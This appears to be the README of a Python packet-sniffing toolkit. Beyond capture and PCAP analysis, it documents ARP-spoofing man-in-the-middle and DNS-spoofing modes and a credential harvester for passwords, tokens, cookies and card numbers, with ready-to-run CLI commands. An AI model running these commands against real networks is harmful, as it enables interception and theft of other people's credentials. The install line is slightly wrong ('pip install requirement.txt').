# M.S.J Sniffing Toolkit v3.2.0

**Maximum Ability Network Traffic Analysis Suite**

```
 __  __       ____            _
|  \/  |     / ___|          | |
| |\/| |     \___ \       _  | |
| |  | |  _   ___) |  _  | |_| |
|_|  |_| (_) |____/  (_)  \___/
```

> "See the wires, hear the whispers" — M.S.J

---

## Features

| Module | Description |
|---|---|
| **Live Capture** | Real-time packet sniffing with Rich TUI — color-coded protocols, bandwidth graphs, credential alerts |
| **MITM Attack** | ARP cache poisoning + DNS spoofing — full man-in-the-middle intercept suite |
| **PCAP Analysis** | Offline deep inspection — TCP stream reassembly, conversation tracking, credential extraction |
| **Credential Harvest** | Passive extraction of passwords, tokens, API keys, sessions, JWTs, credit cards from live traffic |
| **Network Scan** | ARP-based host discovery, interface info, network topology mapping |
| **Interface Discovery** | Categorized interface browser — type detection, IP/MAC/MTU/stats, 25+ interface types recognized |
| **Export Engine** | Multi-format export: PCAP, JSON, CSV, hex dump, text log — real-time and batch |
| **Menu HUD** | Interactive pyfiglet + Rich menu system with keyboard navigation |

### Interface Types Recognized

The discovery engine classifies interfaces by name pattern and capability probing:

| Category | Examples |
|---|---|
| WiFi | `wlan*`, `ath*`, `phy*` |
| WiFi Direct | `p2p*` |
| Cellular / Modem | `ccmni*`, `rmnet*`, `wwan*`, `rndis*` |
| Ethernet | `eth*`, `enp*`, `eno*` |
| Loopback | `lo` |
| Bridge | `br*`, `docker*`, `virbr*` |
| IP Tunnel | `tunl*`, `sit*`, `ip6tnl*` |
| GRE Tunnel | `gre*`, `gretap*`, `erspan*` |
| IPsec VTI | `ip_vti*`, `ip6_vti*` |
| TUN/TAP | `tun*`, `tap*` |
| Dummy | `dummy*` |
| IFB | `ifb*` |
| Virtual | `veth*`, `vboxnet*`, `vmnet*`, `lxcbr*` |
| Bond / Team | `bond*`, `team*` |
| VLAN | `eth*.*` (dot1q subinterfaces) |

### Protocol Support

**L2–L4:** Ethernet · ARP · IPv4 · IPv6 · TCP · UDP · ICMP · DHCP  
**L7:** HTTP · DNS · TLS (SNI extraction) · FTP · WiFi (802.11 beacons)

### Credential Detection

HTTP POST forms · Basic Auth · FTP USER/PASS · API keys · JWT tokens · Session cookies · OAuth · Credit card numbers (Luhn check)

---

## Installation

```bash
# Clone & install
git clone https://github.com/hotsuper901/sniffer-tool.git && cd sniffer-tool && pip install requirement.txt && python3 main.py
```

### Requirements

| Package | Min Version | Purpose |
|---|---|---|
| `scapy` | 2.5.0 | Packet capture, dissection, PCAP I/O |
| `rich` | 13.0.0 | Terminal UI — panels, tables, live display, interface browser |
| `pyfiglet` | 1.0.0 | ASCII art banner generation |
| `netifaces` | 0.11.0 | Network interface enumeration, MAC/IP/flags probing |

> **Note:** Live capture, MITM mode, and scanning require **root/sudo** for raw socket access.

---

## Usage

### Interactive Menu (default)

```bash
python3 main.py
# or:
python3 main.py --menu
```

Navigate with **1–7** keys or arrow keys. Each mode has its own configuration submenu.
In any interface prompt, type **`browse`** to open the categorized interface table.

### Interface Listing

```bash
# List all interfaces with type, status, IP, MAC
python3 main.py --list-if

# Detailed view for a single interface
python3 main.py --iface-detail wlan0
python3 main.py --iface-detail lo
```

### Direct CLI Modes

#### Live Capture

```bash
python3 main.py live -i eth0
python3 main.py live -i wlan0 -f "tcp port 80" --packets 1000
python3 main.py live -i eth0 --export-all my_capture
```

#### MITM Attack

```bash
# ARP spoof target + gateway
sudo python3 main.py mitm -i eth0 -t 192.168.1.100 -g 192.168.1.1

# With DNS spoofing (redirect domains to attacker IP)
sudo python3 main.py mitm -i eth0 -t 192.168.1.100 -g 192.168.1.1 \
    --dns-spoof "*.google.com=192.168.1.50,login.example.com=192.168.1.50"
```

#### Offline PCAP Analysis

```bash
python3 main.py offline -p capture.pcap
python3 main.py offline -p capture.pcap --export-all analysis
```

#### Credential Harvesting

```bash
sudo python3 main.py harvest -i eth0
python3 main.py harvest -i eth0 -o cred_dump
```

#### Network Scan

```bash
python3 main.py scan -i eth0
sudo python3 main.py scan -i wlan0
```

#### Diagnostic Test Suite

```bash
python3 main.py test
```

---

## Full CLI Options

```
python3 main.py [mode] [options]

Modes:
  live       Live packet capture with TUI
  mitm       ARP spoofing MITM attack
  offline    Analyze saved PCAP file
  harvest    Passive credential harvesting
  scan       Network scan / reconnaissance
  test       Full diagnostic suite

Options:
  -i, --interface    Network interface (default: auto)
  -f, --filter       BPF filter (e.g. "tcp port 80")
  -o, --output       Output file prefix
  -t, --target       Target IP (for MITM)
  -g, --gateway      Gateway IP (for MITM)
  -d, --dns-spoof    DNS spoof table: "domain=ip,domain2=ip2"
  -p, --pcap         PCAP file path (for offline)
  --backend          Capture backend: scapy, raw (default: scapy)
  --no-promisc       Disable promiscuous mode
  --timeout          Capture timeout in seconds (0 = infinite)
  --packets          Stop after N packets (0 = unlimited)
  --export-pcap      Export to PCAP file
  --export-json      Export to JSON file
  --export-csv       Export to CSV file
  --export-hex       Export hex dump
  --export-log       Export text log
  --export-all       Export all formats with this prefix
  --no-color         Disable colored output
  --quiet            Suppress non-essential output
  --output-dir       Output directory for exported files
  --list-if          List all network interfaces with type, status, IP, MAC
  --iface-detail N   Show detailed info for interface N (IPs, MAC, MTU, stats)
```

---

## Architecture

```
sniffer-tool/
├── main.py                  # Entry point, CLI parser, mode dispatch
├── requirements.txt
├── modules/
│   ├── __init__.py          # Package metadata
│   ├── capture.py           # Dual-backend capture (scapy + raw socket)
│   ├── dissect.py           # L2-L7 protocol dissector
│   ├── filter.py            # Packet filter engine (rule-based + BPF)
│   ├── export.py            # Multi-format export (PCAP, JSON, CSV, hex, log)
│   ├── display.py           # Rich TUI — live feed, stats, sidebar, alerts
│   ├── analyze.py           # TCP stream follower, conversations, bandwidth, anomaly detection
│   ├── creds.py             # Credential harvester (passwords, tokens, API keys, CC, JWT)
│   ├── mitm.py              # ARP spoofing, DNS spoofing, connection hijacking
│   ├── iface.py             # Interface discovery — type classification, IP/MAC/MTU/stats, browser
│   └── menu.py              # Pyfiglet + Rich interactive menu HUD
```

### Data Flow

```
[Network Interface] → CaptureEngine → dissect_packet() → PacketInfo
                                    ↓
                    ┌───────────────┼────────────────┐
                    ↓               ↓                 ↓
            SnifferDisplay    CredentialHarvester   MultiExporter
            (Rich TUI)        (alerts + storage)    (PCAP/JSON/CSV/hex/log)
                    ↓               ↓
            BandwidthMonitor   ConversationTracker
            AnomalyDetector    TCPStreamFollower
```

---

## Keyboard Controls

### Live TUI

| Key | Action |
|---|---|
| `Q` | Quit capture |
| `P` | Pause / Resume packet feed |
| `F` | Set display filter |
| `C` | Clear feed + alerts |

### Interface Browser

| Key | Action |
|---|---|
| `D` | View detailed info for a specific interface |
| `S` | Select an interface for capture/mode |
| `R` | Refresh interface list |
| `Q` | Return to previous menu |

---

## Notes

- **Live capture on WiFi** needs the interface in monitor mode (`airmon-ng start wlan0` before capture)
- **MITM mode** enables IP forwarding automatically (`/proc/sys/net/ipv4/ip_forward`)
- **ARP tables are restored** on clean exit (Ctrl+C)
- **Export files** are written to `--output-dir` (default: current directory)
- Display feed max depth is 500 packets (configurable in `SnifferDisplay`)
- Interface discovery reads from `/proc/net/dev`, `/sys/class/net/*`, and `netifaces` — no special permissions needed
- Cellular interfaces (`ccmni*`, `rmnet*`) are common on Android devices with Qualcomm modems — the discovery engine recognizes 25+ interface categories

---

Creator: **M.S.J**
